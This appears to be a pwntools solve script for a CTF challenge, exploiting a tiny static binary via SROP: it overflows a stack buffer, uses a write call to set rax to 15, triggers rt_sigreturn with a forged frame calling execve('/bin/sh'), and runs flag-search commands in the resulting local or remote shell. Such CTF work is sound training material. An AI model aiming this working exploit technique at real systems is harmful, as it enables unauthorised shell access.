#!/usr/bin/env python3
"""0xGame 2026 - 21 "大道至简" (Pwn, 973pts, SROP)

Target: firmware/21_大道至简/pwn   (9240 bytes)

Binary facts (readelf / objdump -d -M intel):
    ELF64 x86-64, EXEC, statically linked, not stripped, no libc / no PLT.
    PIE: no (base 0x400000) | Canary: no | GNU_STACK missing -> stack executable
    .text is only 0x7d bytes; only syscalls (no libc imports at all).

Recovered semantics (the whole program):

    _start:  write(1, "Welcome to the real SROP challenge.\n", 0x24)
             call vuln
             exit(0)

    vuln:    push rbp; mov rbp, rsp; sub rsp, 0x10
             read(0, rsp, 0x400)          <-- 0x10 buf + saved rbp + ret = 0x18 to RIP
             xor rax, rax                 <-- rax forced to 0 before returning
             leave; ret

    magic:   write(1, "SROP is magic!\n", 15)   <-- returns rax = 15 !!
             ret
    gadget:  syscall; ret                       <-- @0x40107a
    .data:   "/bin/sh\\0"                        @0x403033

Why it is a SROP: only `syscall; ret` is available and rax == 0 after vuln, so
the first re-entry can only be read(0, buf, 0x400).  To reach rt_sigreturn we
need rax == 15, and `magic` hands it to us: write() returns the byte count, 15.
So the chain is  magic -> gadget -> rt_sigreturn, and the frame is read
straight out of our first overflow.

Stack layout of vuln's frame (buffer = rbp-0x10):
    +0x00 .. +0x0f   local buffer (padding)
    +0x10 .. +0x17   saved rbp
    +0x18 .. +0x1f   return address            -> magic
    +0x20 .. +0x27   magic's return address    -> gadget (0x40107a)
    +0x28 ..         SigreturnFrame (248 B)    <- rsp when rt_sigreturn fires

Frame: rax=59 (execve), rdi="/bin/sh", rsi=0, rdx=0, rip=gadget, rsp=writable.

Usage:
    python3 scripts/21-solve.py                 # local: ./pwn next to a fake flag
    python3 scripts/21-solve.py HOST PORT       # remote
    python3 scripts/21-solve.py HOST PORT -i    # hand over an interactive shell
"""
import os
import re
import sys
import time

from pwn import *  # noqa: F401,F403

context.arch = 'amd64'
context.log_level = 'info'

HERE = os.path.dirname(os.path.abspath(__file__))
CANDIDATES = [
    os.path.join(HERE, '..', 'work', '21_simple', 'pwn'),
    os.path.join(HERE, '..', 'firmware', '21_大道至简', 'pwn'),
    './pwn',
]


def find_binary():
    """Return an executable copy of the challenge binary.

    The original attachment under firmware/ is read-only and not marked +x, so
    it is copied into work/21_simple/ before being run.
    """
    import shutil
    for c in CANDIDATES:
        if not os.path.isfile(c):
            continue
        c = os.path.abspath(c)
        if os.access(c, os.X_OK):
            return c
        dst = os.path.join(HERE, '..', 'work', '21_simple', 'pwn')
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copyfile(c, dst)
        os.chmod(dst, 0o755)
        return os.path.abspath(dst)
    sys.exit("[-] pwn binary not found; copy it to ./pwn in cwd")


def build(e):
    magic = e.symbols['magic']      # 0x40105b: write(...) -> rax = 15
    gadget = e.symbols['gadget']    # 0x40107a: syscall ; ret
    binsh = next(e.search(b'/bin/sh\x00'))

    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve     # 59
    frame.rdi = binsh                    # 0x403033
    # argv -> a zeroed qword right after "/bin/sh\0" (mapped RW, .bss):
    # argc==0 is legal, but a *valid* argv pointer keeps busybox/musl sh happy
    # compared with a literal NULL argv.
    frame.rsi = 0x40303b
    frame.rdx = 0
    frame.rip = gadget                   # syscall -> execve("/bin/sh", 0, 0)
    frame.rsp = 0x403b00                 # RW page, executable never returns

    payload = b'A' * 0x10                # vuln's 16-byte stack buffer
    payload += p64(0)                    # saved rbp (unused)
    payload += p64(magic)                # ret        -> rax = 15
    payload += p64(gadget)               # magic: ret -> syscall; ret
    payload += bytes(frame)              # read here by rt_sigreturn
    return payload


FIND = (b'cat /flag /flag.txt /flag* 2>/dev/null; '
        b'cat ./flag ./flag* flag* 2>/dev/null; '
        b'cat /home/*/flag* 2>/dev/null; '
        b'cat /root/flag* 2>/dev/null; echo __END_FLAG_SEARCH__')
FLAG_RE = re.compile(rb'(?:0xGame|flag)\{[^}\n]{1,200}\}')


def main():
    argv = sys.argv[1:]
    interactive = '-i' in argv
    argv = [a for a in argv if a != '-i']

    e = ELF(find_binary(), checksec=False)
    log.info(f"magic={e.symbols['magic']:#x} gadget={e.symbols['gadget']:#x}")

    if len(argv) >= 2:
        io = remote(argv[0], int(argv[1]))
    else:
        io = process(e.path)

    io.recvuntil(b'challenge.\n', timeout=5)
    io.send(build(e))

    if interactive:
        io.interactive()
        return

    # Give the program a moment to finish rt_sigreturn before we talk to the
    # shell: vuln's read() takes up to 0x400 bytes and would otherwise swallow
    # our command line together with the frame.
    time.sleep(0.3)
    io.sendline(FIND)
    data = io.recvrepeat(3.0)
    sys.stdout.write(data.decode(errors='replace'))

    m = FLAG_RE.search(data)
    if m:
        print(f"\n[+] FLAG: {m.group(0).decode()}")
    else:
        print("\n[-] no flag pattern in output (check stderr/io.interactive())")
    io.close()


if __name__ == '__main__':
    main()
